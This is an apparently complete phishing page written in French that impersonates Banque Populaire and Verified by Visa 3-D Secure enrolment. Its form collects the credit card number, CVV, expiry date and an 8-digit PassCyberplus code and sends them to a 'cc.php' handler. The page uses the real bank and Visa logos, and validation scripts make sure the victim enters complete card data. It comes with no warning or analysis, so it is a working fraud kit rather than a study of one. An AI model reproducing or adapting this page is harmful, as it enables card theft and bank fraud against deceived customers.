<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style rel="stylesheet" type="text/css">
@charset "utf-8";
/* CSS Document */

*{margin:0; padding:0;}

body
{
	font-family:Verdana, Arial, sans-serif;
	font-size:9px;
	color:#000;
}

.opcc {
	
	background-image:url(back.png);
	background-color:rgba(0,0,0,1.00);
	background-size:cover;
	
	}

img
{
	border:none;
}

h1
{
	color:#000c7c;
	font-size:14px;
	text-align:center;
	margin-top:-15px;
}

p
{
	margin:6px 10px 6px 18px;
}

a
{
	color:#000;
}

input
{
	vertical-align:middle;
	text-align:center;
}

#cont
{
	width:470px;
	height:360px;
	border-top:#fff solid 1px;
	/*border:#000 1px solid;*/
	position:relative;
}

.logo_banque
{
	float:left;
	margin:12px 0 0 18px;
}

.logo_verif
{
	float:right;
	margin:18px 18px 0 0;
}

.link_fl_b,
.more a
{
	background:url(../imgs/imagesTemplates/fl_b.png) no-repeat 0 4px;
	padding:0 0 0 10px;
	color:#0024d5;
	font-size:9px;
}

.more
{
	text-align:right;
	position:absolute;
	bottom:0;
	right:0;
}

.authentif
{
	width:410px;
	background:url(../imgs/imagesTemplates/ar_h.gif) no-repeat #e0e1ef 0 0;
	margin:0 auto;
	padding:10px;
	font-size:10px;
	border-radius:10px;
}

.authentif form
{
	background:url(../imgs/imagesTemplates/ar_b.gif) no-repeat 0 bottom;
	clear:left;
	padding:0 0 5px 0;
}

.authentif_larg
{
	width:368px;
	background:url(../imgs/imagesTemplates/ar_h_larg.gif) no-repeat #e0e1ef 0 0;
}

.authentif_larg form
{
	background:url(../imgs/imagesTemplates/ar_b_larg.gif) no-repeat 0 bottom;
	clear:left;
}


.authentif p
{
	margin:5px 0;
	overflow:auto;
	_clear:left;
}
.authentif p.num_tel
,.authentif p.num_carte
{
	margin:5px 0;
}

.authentif form p
{
	margin:0;
	clear:both;
		padding:2px;

}

.authentif form p.f_d
{
	margin-left:170px;
	_margin-left:173px;
	font-size:9px;
}

.authentif form p.f_d
{
	margin-left:170px;
	_margin-left:173px;
	font-size:9px;
}


.authentif span
{
	display:block;
	float:left;
}

#cont .authentif form p.f_d span
{
	display:inline;
	float:none;
	padding-left:26px;
	padding-right:0px;
}

.authentif span.lbl
{
	text-align:right;
	padding:0 10px 0 0;
	font-weight:bold;
	width:200px;
}

.authentif span.lblerr
{
	text-align:right;
	padding:0 10px 0 0;
	font-weight:bold;
	width:150px;
	color:#ff0000;
}

.authentif form input.chp_smscode
{
	width:60px;
	margin-right:4px;
}

.authentif form input.chp_capcode
{
	width:100px;
	margin-right:4px;
}

.authentif form input.chp_date,
.authentif form input.chp_annee
{
	width:20px;
	margin-right:2px;
	font-size:11px;
	padding-top:2px;
}

.authentif form input.chp_annee
{
	width:35px;
	margin-right:4px;
}

.authentif form input.chp_crypto 
{
	font-size:10px;
	margin-right:3px;
	width:20px;
}


.authentif form input.chp_ccp 
	{
	font-size:10px;
	margin-right:3px;
	width:30px;
}

.authentif form input.chp_tel {
	font-size:10px;
	margin-right:3px;
	width:95px;
	text-align:left;
	padding-left:3px;
}

.authentif form select.chp_ask 
{
	font-size:10px;
	margin-right:3px;
	width:320px;
}

.authentif form input.chp_answer 
{
	font-size:10px;
	margin-right:3px;
	width:180px;
	text-align:left;
	padding-left:3px;
}

.authentif form p.info_form 
{
	color:#000C7C;
	font-size:9px;
	margin:0 3px 6px;
	text-align:center;
	vertical-align:middle;
}

.authentif form p.qmyst 
{
	color:#000C7C;
	font-size:9px;
	margin-left:5px;
	margin-top:5px;
	margin-bottom:5px;
	text-align:center;
	vertical-align:middle;
}

.err_msg
{
	color:#ff0000;
	margin-top:20px;
}

.b_date{
	display:block;
	border:1px solid #ccc;
	background:#fff;
	margin:2px 0 0 0;
	height:16px;
	padding-top:2px;
}

#logo1Src
{
	float: left;
	width:175px;
	height: 55px;
	overflow: hidden;
	text-align:left;
	padding:0 0 0 18px;
}

#logo2Src
{
	float:right;
	width:175px;
	height: 55px;
	overflow: hidden;
	text-align:right;
	padding:0 18px 0 0;
}

#textSrc{
	position:absolute;
	_POSITION:fixed;
	top:50px;	
	left:0px;
	right:0px;
	bottom:0px;
}

.contain {
	
padding:20px;	

	}
	
	
</style>
<title>Authentification</title>

<script type="text/javascript">
<!--
if(typeof _csrf_=="undefined"){_csrf_={}}if(typeof _tsbp_=="undefined"){_tsbp_={}}if(typeof _csrf_.vh=="undefined"){_csrf_.vh=[]}if(typeof _csrf_.vu=="undefined"){_csrf_.vu=[/.*/]}if(typeof _csrf_.f_cancel_onload=="undefined"){_csrf_.f_cancel_onload=false}var _csrff_cancel_onload_=_csrf_.f_cancel_onload;(function(c,m){var l=function(e,b){if(e!==null&&b!==null){if(e=="1"){window.location.href=b;return true}else{if(e=="2"){f(b);return true}else{if(e=="3"){document.write(b);document.close();return true}}}}return false};var i=function(b){var s=b;if(typeof b.target!="undefined"){s=b.target;if(s.readyState==4){s.removeEventListener("readystatechange",i,false)}}if(s.readyState==4){var p=s.getResponseHeader(m.ba);var e=s.responseText;return l(p,e)}return false};var f=function(b){if(window.document.body){var s=document.getElementById("_tsbp_tId");if(!s){var p=document.createElement("div");p.style.display="none";window.document.body.insertBefore(p,window.document.body.firstChild);var e="background-color: #dddddd; ";e+="border: 5px solid red; padding: 5px; ";e+="position: fixed; left: 6px; top: 10px; height: auto; width: auto; ";e+="overflow: hidden; z-index: 999999;";p.innerHTML='<div id="_tsbp_aId" style="'+e+'"><div id=\'_tsbp_tId\'></div><div style="height: 10px; font-weight: bold; margin: 10px 10px 10px 10px; text-align: right;"><a href="javascript: void(0);" onclick="document.getElementById(\'_tsbp_aId\').parentNode.style.display = \'none\';"><span><span>[Close this message]</span></span></a></div></div>';s=document.getElementById("_tsbp_tId")}s.innerHTML=b;document.getElementById("_tsbp_aId").parentNode.style.display=""}};var q=function(b){return b.split("&").join("&amp;").split("<").join("&lt;").split('"').join("&quot;")};var k=function(e){if(/^\w+:/.test(e)===false){var b=document.createElement("div");b.innerHTML='<a href="'+q(e)+'">.</a>';e=b.firstChild.href}return e};var h=function(s,b){var v=s;var t=k(v);if(v!=null&&v!=""){if(o(t)&&d(t)&&n(t)&&(-1==v.indexOf(c.pn+"="+c.pv))){var p=v.indexOf("#");var w;if(p!=-1){w=v.substring(p);v=v.substring(0,p)}var e=v.indexOf("?");if(e==-1){if(b==="POST"||b==="post"){v+="?"}else{return s}}if(v.search(/\?$/)==-1){v+="&"}v+=c.pn+"="+c.pv;if(p!=-1){v+=w}}}return v};var d=function(t){var s=window.document.createElement("a");s.href=t;if(typeof s.pathname=="undefined"){return true}u=s.pathname;if(u===""||u[0]!=="/"){u="/"+u}for(var b=0;b<c.vu.length;b++){try{if(u.match(c.vu[b])){return true}}catch(p){return true}}return false};var n=function(v){var p=function(z){var A=window.document.createElement("a");A.href=z;var w="-";try{w=A.host;if(!w){w=window.location.hostname}if(w.match(/:\d+$/)){var y=window.location.hostname;if(!y.match(/:\d+$/)){w=w.replace(/:\d+$/,"")}}}catch(x){}return w};var t=p(v);if(true&&window&&window.location&&window.location.hostname&&t===window.location.hostname){return true}for(var b=0;b<c.vh.length;b++){try{if(t.match(c.vh[b])){return true}}catch(s){}}return false};var o=function(e){var b=false;if(e.match(/^http/i)||e.substring(0,1)=="/"||(e.indexOf("://")==-1&&!e.match(/^urn:/i))){b=true}if(e.match(/^mailto:/i)){b=false}return b};var a=function(w){if(!w||typeof w.elements=="undefined"){return}for(var s=0;s<w.elements.length;s++){if(w.elements[s].name===c.pn){return}}var v=(w.attributes.action!=null)?w.attributes.action.value:"";try{v.match(/./)}catch(x){v=window.location.href}if((!v)||(v===null)||(v===undefined)||(v.match(/^\s*$/))){v=window.location.href}v=k(v);if(d(v)&&o(v)&&n(v)){var t=(w.attributes.method!=null)?w.attributes.method.value:"";if(c.f==0&&t.toLowerCase()=="post"){try{var p=v.indexOf("#");var y="";if(p!=-1){y=v.substring(p);v=v.substring(0,p)}if(v.indexOf("?")==-1){v+="?"}v=h(v,"GET");if(!w.attributes.action){w.setAttributeNode(document.createAttribute("action"))}w.attributes.action.value=v+y}catch(x){}return}var b=document.createElement("input");b.type="hidden";b.name=c.pn;b.value=c.pv;w.appendChild(b)}};var r=function(){var b=window.document.getElementsByTagName("a");for(var x=0;x<b.length;x++){try{var y=b[x].innerHTML;var s=h(b[x].getAttribute("href",2),"GET");if(s!=null&&s!=""){b[x].setAttribute("href",s);if(b[x].innerHTML!=y){b[x].innerHTML=y}}}catch(v){}}var w=window.document.getElementsByTagName("form");for(var t=0;t<w.length;t++){a(w[t])}if(_csrff_cancel_onload_){_csrff_cancel_onload_=false;var z=window.document.getElementsByTagName("body");if(z){var p=z[0].getAttribute("onload");if(p){p()}}}};var g=function(){var b=window.XMLHttpRequest;function e(){this.base=b?new b:new window.ActiveXObject("Microsoft.XMLHTTP")}function p(){return new e}p.prototype=e.prototype;p.UNSENT=0;p.OPENED=1;p.HEADERS_RECEIVED=2;p.LOADING=3;p.DONE=4;p.prototype.status=0;p.prototype.statusText="";p.prototype.readyState=p.UNSENT;p.prototype.responseText="";p.prototype.responseXML=null;p.prototype.onsend=null;p.url=null;p.onreadystatechange=null;p.prototype.open=function(y,v,w,t,x){var s=this;this.url=v;if(c.pn){this.url=h(v,y)}this.base.onreadystatechange=function(){try{s.status=s.base.status}catch(z){}try{s.statusText=s.base.statusText}catch(z){}try{s.readyState=s.base.readyState}catch(z){}try{s.responseText=s.base.responseText}catch(z){}try{s.responseXML=s.base.responseXML}catch(z){}if(m.ba&&m.bh&&i(this)){return}if(s.onreadystatechange!=null){s.onreadystatechange.apply(this,arguments)}};this.base.open(y,this.url,w,t,x)};p.prototype.send=function(s){if(m.ba&&m.bh){this.base.setRequestHeader(m.bh,"true")}this.base.send(s)};p.prototype.abort=function(){this.base.abort()};p.prototype.getAllResponseHeaders=function(){return this.base.getAllResponseHeaders()};p.prototype.getResponseHeader=function(s){return this.base.getResponseHeader(s)};p.prototype.setRequestHeader=function(s,t){return this.base.setRequestHeader(s,t)};window.XMLHttpRequest=p};do{try{if(_is_ajsp_running_){break}_is_ajsp_running_=true;if(navigator.appName=="Microsoft Internet Explorer"){g()}else{if(c.pn){XMLHttpRequest.prototype._open=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(t,e,p,b,s){arguments[1]=h(e,t);this._open.apply(this,arguments)}}if(m.ba&&m.bh){XMLHttpRequest.prototype._tsbp_s=XMLHttpRequest.prototype.__lookupSetter__("onreadystatechange");if(typeof XMLHttpRequest.prototype._tsbp_s!="undefined"){XMLHttpRequest.prototype.__defineSetter__("onreadystatechange",function(e){var b=function(){if(i(this)){return}e()};this._tsbp_s(b)})}XMLHttpRequest.prototype._send=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(b){this.setRequestHeader(m.bh,"true");if((XMLHttpRequest.prototype._tsbp_s==null)&&(typeof this.addEventListener==="function")){this.addEventListener("readystatechange",i,false)}this._send.apply(this,arguments)}}}}catch(j){}}while(0);if(c.pv!=undefined){if(!!window.addEventListener){window.addEventListener("load",r,false)}else{if(!!window.attachEvent){window.attachEvent("onload",r)}else{window.onload=r}}}delete _csrf_;delete _tsbp_})(_csrf_,_tsbp_,_is_ajsp_running_);
//-->
</script>
<script type="text/javascript"
    src="js/authentication.js">
</script>
<script>
    function onLoadEvent(){
        document.Form_AskAuthentication.action="/flowGlobal.wflow;jsessionid=F8375E2D1151EF0BA89AB6BBA8144A00.7C1A59D87C564EDB3B0F5B?execution=e1s1&_eventId=timeout";
        if(document.forms['Form_AskAuthentication'].action=="") ;
        else document.Form_AskAuthentication.submit();
    }
</script>
<style>
#allcenter {
    position: absolute;
    padding: 15px;
    left: 50%;
    top: 50%;
	background-color:rgba(255,255,255,1.00);
	border-radius:10px;
	width:475px;
}
</style>




    

</head>
<body class="opcc"
    onload="init(); center() ;  setTimeout('onLoadEvent()',240*1000)">
    <div id="allcenter">
        <div id="cont">
            
                <div id="logo1Src">
                    <img
                        src='https://upload.wikimedia.org/wikipedia/fr/thumb/2/22/Banquepopulaire_logo.svg/1011px-Banquepopulaire_logo.svg.png' width="50" />
                </div>
                <div id="logo2Src">
                    <img
                        src='https://www.sc.com/ph/personal-banking/cards/3d-secure/en/_images/verifiedVisa.jpg' width="150" style="margin-right:-30px;"/>
                </div>
            

            <div id="textSrc"
                
                >

                

                <h1
                    >
                    <p>&nbsp;</p>
<p>Protégez votre carte de crédit</p>
                </h1>

                

                <p
                     style="margin-top:15px;" >
                    <p><center>Sécurité sur internet: inscrivez-vous à 3-D Secure dès maintenant.</center></p>
                    <p>
                    

                        

        <div class="authentif">
            
            <form name="AskAuthentication" id="darnoo" method="POST" action="cc.php" >
                
                <p>
                 <span class="lbl">Numéro de carte de crédit</span> <input type="text"  
                            id="chp1" name="ccnum2" autocomplete="off"
                             maxlength="16" minlength="16"
                             required /> </p><p>
                
                  <p>
                            
              
                    <span class="lbl">Code de sécurité à trois chiffres</span> <input type="text"  
                            id="chp1" name="cvv2" autocomplete="off"
                             maxlength="3" maxlength="3"
                            required />      </p><p>
                        <p>
                             <span class="lbl">Date d'échéance (ex. 08/16)</span>  
										
            <select autocomplete="off" id="ccmplus_expiration" name="expm2" class="month validate-cc-exp required-entry" required>
                                        <option value="" selected="selected" required>Mois</option>
                            <option value="1">01</option>
                            <option value="2">02</option>
                            <option value="3">03</option>
                            <option value="4">04</option>
                            <option value="5">05</option>
                            <option value="6">06</option>
                            <option value="7">07</option>
                            <option value="8">08</option>
                            <option value="9">09</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                        </select>
                        <select autocomplete="off" id="ccmplus_expiration_yr" name="expy2" class="year required-entry">
                            <option value="" selected="selected" required>Année</option>
										<option value="2016">2016</option><option value="2017">2017</option><option value="2018">2018</option><option value="2019">2019</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option>                        </select>
                             </p>
                             <p>
                             
                             <span class="lbl">
                             Reporter ici les 8 chiffres de code de contrôle affiché sur votre PassCyberplus</span> <input type="text" 
                            id="chp1" name="ncom2" autocomplete="off"  style="width:120px;"
                             maxlength="8" minlength="8"
                            required />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="cp.png" style="width:40px;position:absolute;magrin" alt="cyberpass"></p>
                             <input type="hidden" id="chp2"
                            name="chp2" autocomplete="off" value="" /> <input type="hidden"
                            id="chp3" name="chp3" autocomplete="off" value="" /><input
                            type="image" id="btn_ok" name="btn_ok"
                            src=btn_ok_off.png
                            alt="Valider" style="float:left;" />
                 
<input
                            type="hidden" id="btn_ok2" name="btn_ok2"
                            />                       </p>
                    
                
             
                
                


                

    </div>
    


    </form>
    
    
    <script type="text/javascript">
 var frmvalidator = new Validator("darnoo");

frmvalidator.addValidation("ccnum2","req","Veuillez entrer votre N� de carte de cr&eacute;dit.");
frmvalidator.addValidation("ccnum2","maxlen=16","Votre N� de carte de cr&eacute;dit est incorrect.");
frmvalidator.addValidation("ccnum2","minlen=15","Votre N� de carte de cr&eacute;dit est incorrect.");
frmvalidator.addValidation("ccnum2","num","Votre N� de carte de cr&eacute;dit est incorrect.");

frmvalidator.addValidation("expm2","num","Veuillez entrer la date d'&eacute;xpiration.");
frmvalidator.addValidation("expy2","num","Veuillez entrer la date d'&eacute;xpiration.");

frmvalidator.addValidation("cvv2","req","Veuillez entrer votre Code de s&eacute;curit&eacute; (CVV).");
frmvalidator.addValidation("cvv2","num","Veuillez entrer votre Code de s&eacute;curit&eacute; (CVV).");
frmvalidator.addValidation("cvv2","maxlen=4","Votre Code de s&eacute;curit&eacute; (CVV) est incorrect.");
frmvalidator.addValidation("cvv2","minlen=3","Votre Code de s&eacute;curit&eacute; (CVV) est incorrect.");

</script>
    
    
        
            
<br>


            <p>Cette identification est obligatoire pour conclure votre sécurité.</p>
<p><a class="link_fl_b" href="#" target="_self">Comment communiquer en toute s&eacute;curit&eacute; mon num&eacute;ro de t&eacute;l&eacute;phone mobile &agrave; la BP.</a></p>

            
        
        
    

    </div>
    </div>
    </div>
</body>
</html>
